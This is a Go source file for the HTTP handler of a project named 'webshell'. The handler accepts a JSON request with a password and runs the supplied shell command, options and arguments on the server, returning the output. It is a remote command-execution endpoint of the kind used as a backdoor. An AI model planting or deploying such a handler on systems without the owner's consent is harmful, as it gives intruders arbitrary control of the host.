package handlers

import (
	"encoding/json"
	"errors"
	"net/http"
	"webshell/lib/common"
	"webshell/lib/shell"
)

var RequiredPassword *string

func decodeRequest(r *http.Request) (common.Command, error) {
	var req common.Command

	err := json.NewDecoder(r.Body).Decode(&req)

	if err != nil {
		return req, errors.New("error parsing json payload")
	}

	return req, nil
}

func verifyPassword(givenPassword string) error {
	if givenPassword != *RequiredPassword {
		return errors.New("wrong password")
	}

	return nil
}

func Handler(w http.ResponseWriter, r *http.Request) {
	command, err := decodeRequest(r)

	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	err = verifyPassword(command.Pass)

	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	err = shell.ExecuteCommand(command.Cmd, command.Opt, command.Args, w)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
}
